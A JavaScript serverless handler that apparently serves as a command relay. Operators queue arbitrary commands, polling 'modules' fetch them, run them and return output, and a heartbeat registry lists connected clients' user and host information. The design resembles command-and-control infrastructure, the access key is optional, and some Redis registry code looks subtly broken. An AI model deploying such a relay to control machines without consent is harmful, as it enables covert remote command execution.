const STORE = process.env.UPSTASH_URL && process.env.UPSTASH_TOKEN ? 'redis' : 'memory';

const mem = new Map();
const regMem = new Map();

function room(name) {
  if (!mem.has(name)) mem.set(name, { q: [], res: [] });
  return mem.get(name);
}

/* ---------- redis helpers (optional durable store) ---------- */
async function rcmd(...parts) {
  const url = `${process.env.UPSTASH_URL}/` + parts.map(encodeURIComponent).join('/');
  const r = await fetch(url, { headers: { Authorization: `Bearer ${process.env.UPSTASH_TOKEN}` } });
  const j = await r.json();
  if (j.error) throw new Error(j.error);
  return j.result;
}
async function rget(key) { return await rcmd('get', key); }
async function rset(key, val) { await rcmd('set', key, val); }

async function pushQ(roomName, item) {
  if (STORE === 'redis') {
    const cur = (await rget(`q:${roomName}`)) || '';
    await rset(`q:${roomName}`, cur ? cur + '\n' + item : item);
  } else {
    room(roomName).q.push(item);
  }
}
async function takeQ(roomName) {
  if (STORE === 'redis') {
    const cur = (await rget(`q:${roomName}`)) || '';
    if (!cur) return [];
    await rset(`q:${roomName}`, '');
    return cur.split('\n').filter(Boolean);
  }
  const r = room(roomName).q;
  return r.splice(0, r.length);
}
async function pushRes(roomName, item) {
  if (STORE === 'redis') {
    const cur = (await rget(`res:${roomName}`)) || '';
    await rset(`res:${roomName}`, cur ? cur + '\n' + item : item);
  } else {
    const rm = room(roomName);
    rm.res.push(item);
    if (rm.res.length > 200) rm.res.splice(0, rm.res.length - 200);
  }
}
async function takeRes(roomName, since) {
  let lines;
  if (STORE === 'redis') {
    lines = (((await rget(`res:${roomName}`)) || '').split('\n')).filter(Boolean);
  } else {
    lines = room(roomName).res;
  }
  const out = [];
  for (let i = since; i < lines.length; i++) out.push({ i, l: lines[i] });
  return out;
}

/* ---------- client registry (heartbeat based) ---------- */
const ONLINE_MS = 15000;
const PRUNE_MS = 10 * 60 * 1000;

function regRec(roomName, user, info) {
  return JSON.stringify({ room: roomName, user, info, ts: Date.now() });
}
async function regPut(roomName, user, info) {
  if (STORE === 'redis') {
    await rset(`reg:${roomName}`, regRec(roomName, user, info));
  } else {
    regMem.set(roomName, { room: roomName, user, info, ts: Date.now() });
  }
}
async function regAll() {
  const now = Date.now();
  const list = [];
  if (STORE === 'redis') {
    let cursor = 0;
    do {
      const [next, keys] = await rcmd('scan', String(cursor), 'match', 'reg:*', 'count', '200');
      cursor = parseInt(next, 10);
      for (const k of keys || []) {
        try {
          const rec = JSON.parse((await rget(k.slice(4))) || 'null');
          if (rec && now - rec.ts < PRUNE_MS) list.push(rec);
        } catch (e) {}
      }
    } while (cursor !== 0 && list.length < 500);
  } else {
    for (const [k, rec] of regMem.entries()) {
      if (now - rec.ts > PRUNE_MS) regMem.delete(k);
      else list.push(rec);
    }
  }
  list.sort((a, b) => b.ts - a.ts);
  return list.map((r) => ({
    room: r.room,
    user: r.user,
    info: r.info,
    msAgo: Math.max(0, now - r.ts),
    online: now - r.ts < ONLINE_MS
  }));
}

function b64e(s) { return Buffer.from(String(s), 'utf8').toString('base64url'); }
function b64d(s) { try { return Buffer.from(s, 'base64url').toString('utf8'); } catch (e) { return ''; } }

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const a = req.query.a || '';
  const roomName = String(req.query.room || 'default').slice(0, 64);
  const key = String(req.query.k || '');

  const required = process.env.RELAY_KEY;
  if (required && key !== required) {
    return res.status(401).json({ ok: false, error: 'bad relay key' });
  }

  function readBody() {
    return new Promise((resolve) => {
      let body = '';
      req.on('data', (c) => { body += c; });
      req.on('end', () => resolve(body));
    });
  }

  try {
    if (a === 'ping') return res.json({ ok: true, store: STORE });

    if (a === 'hb') {
      if (!key) return res.status(401).send('bad key');
      await regPut(roomName,
        String(req.query.u || '?').slice(0, 64),
        String(req.query.i || '').slice(0, 200));
      return res.type('text/plain').send('ok');
    }

    if (a === 'clients') {
      return res.json({ ok: true, clients: await regAll(), store: STORE });
    }

    if (a === 'op-send' && req.method === 'POST') {
      let cmd, cid;
      try {
        const j = JSON.parse(await readBody());
        cmd = String(j.command || '').slice(0, 4900000);
        cid = String(j.cid || ('c' + Date.now() + Math.random().toString(36).slice(2, 6)));
      } catch (e) {
        return res.status(400).json({ ok: false, error: 'bad json' });
      }
      if (!cmd.trim()) return res.status(400).json({ ok: false, error: 'empty command' });
      await pushQ(roomName, `${cid}|${b64e(cmd)}`);
      return res.json({ ok: true, cid });
    }

    if (a === 'mod-poll') {
      if (!key) return res.status(401).type('text/plain').send('bad key');
      const items = await takeQ(roomName);
      return res.type('text/plain').send(items.join('\n'));
    }

    if (a === 'mod-result' && req.method === 'POST') {
      if (!key) return res.status(401).type('text/plain').send('bad key');
      const body = await readBody();
      const parts = body.split('|');
      if (parts.length < 2) return res.status(400).send('bad');
      await pushRes(roomName, body);
      return res.type('text/plain').send('ok');
    }

    if (a === 'op-poll') {
      const since = parseInt(req.query.since, 10) || 0;
      const items = await takeRes(roomName, since);
      return res.json({
        ok: true,
        store: STORE,
        next: since + items.length,
        results: items.map((x) => {
          const p = x.l.split('|');
          return { cid: p[0], text: b64d(p.slice(1).join('|')) };
        })
      });
    }

    return res.status(404).json({ ok: false, error: 'unknown action' });
  } catch (e) {
    return res.status(500).json({ ok: false, error: String(e.message || e) });
  }
}
